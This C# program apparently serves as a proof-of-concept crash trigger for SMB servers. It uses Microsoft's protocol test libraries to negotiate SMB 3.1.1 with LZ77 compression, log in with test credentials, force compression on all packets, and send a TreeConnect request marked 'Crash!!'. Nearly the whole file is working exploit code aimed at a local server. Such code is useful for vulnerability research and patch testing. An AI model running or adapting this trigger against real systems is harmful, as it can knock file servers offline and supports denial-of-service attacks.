using Microsoft.Protocols.TestSuites.FileSharing.Common.Adapter;
using Microsoft.Protocols.TestSuites.FileSharing.Common.TestSuite;
using Microsoft.Protocols.TestSuites.FileSharing.SMB2.Adapter;
using Microsoft.Protocols.TestTools.StackSdk.Dtyp;
using Microsoft.Protocols.TestTools;
using Microsoft.Protocols.TestTools.StackSdk;
using Microsoft.Protocols.TestTools.StackSdk.FileAccessService.Smb2;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using System.Net;
using Microsoft.VisualStudio.TestPlatform.ObjectModel.DataCollection;
using  Microsoft.Protocols.TestTools.StackSdk.Security.SspiService;
using static Microsoft.Protocols.TestTools.StackSdk.Security.KerberosLib.KerberosConstValue;
using Microsoft.Protocols.TestTools.StackSdk.Security.SspiLib;

class Program
{
    public static ulong messageid = 0;
    public static ulong sessionid = 0;
    public static void Main()
    {
        Console.WriteLine("Hello Smb trigger crash");
        Smb2Client client = new Smb2Client(new TimeSpan(0,0,5000));
        client.CompressionInfo.CompressionIds = new CompressionAlgorithm[] { CompressionAlgorithm.LZ77 };
        client.ConnectOverTCP(IPAddress.Parse("127.0.0.1"));
        uint status;
        Smb2NegotiateRequestPacket negotiateRequest;
        Smb2NegotiateResponsePacket negotiateResponse;
        
         
        byte[] gsstoken;
        DialectRevision selectedDialect;
        client.Negotiate(
            1,
            1,
            Packet_Header_Flags_Values.NONE,
            messageid++,
            new DialectRevision[] { DialectRevision.Smb311 },
            SecurityMode_Values.NEGOTIATE_SIGNING_ENABLED,
            Capabilities_Values.NONE,
            Guid.NewGuid(),
            out selectedDialect,
            out gsstoken,
            out negotiateRequest,
            out negotiateResponse,
            0,
            new PreauthIntegrityHashID[] { PreauthIntegrityHashID.SHA_512 },
            new EncryptionAlgorithm[] { EncryptionAlgorithm.ENCRYPTION_AES128_CCM}
            //,new CompressionAlgorithm[] { CompressionAlgorithm.LZ77 }
        );
        SspiClientSecurityContext sspiClientGss =
                new SspiClientSecurityContext(
                    SecurityPackageType.Negotiate,
                    new AccountCredential("", "test", "test"),
                    Smb2Utility.GetCifsServicePrincipalName(""),
                    ClientSecurityContextAttribute.None,
                    SecurityTargetDataRepresentation.SecurityNativeDrep);

        sspiClientGss.Initialize(gsstoken);
        Packet_Header packetheader;
        SESSION_SETUP_Response sessionSetupResponse;
        client.SessionSetup(
            1,
            1,
            Packet_Header_Flags_Values.NONE,
            messageid++,
            sessionid++,
            SESSION_SETUP_Request_Flags.NONE,
            SESSION_SETUP_Request_SecurityMode_Values.NEGOTIATE_SIGNING_ENABLED,
            SESSION_SETUP_Request_Capabilities_Values.GLOBAL_CAP_DFS,
            0,
            sspiClientGss.Token,
            out sessionid,
            out gsstoken,
            out packetheader,
            out sessionSetupResponse

         );
        client.CompressionInfo.CompressAllPackets = true;
        TREE_CONNECT_Response treeConnectResp;
        string uncSharePath = Smb2Utility.GetUncPath("ajomix", "test");/* ---> "\\ajomix\test"  */
        Console.WriteLine( uncSharePath );
        uint treeId;

        // Crash!!
        client.TreeConnect(
            1,
            1,
            Packet_Header_Flags_Values.NONE,
            messageid++,
            sessionid++,
            uncSharePath,
            out treeId,
            out packetheader,
            out treeConnectResp
        );
    }
}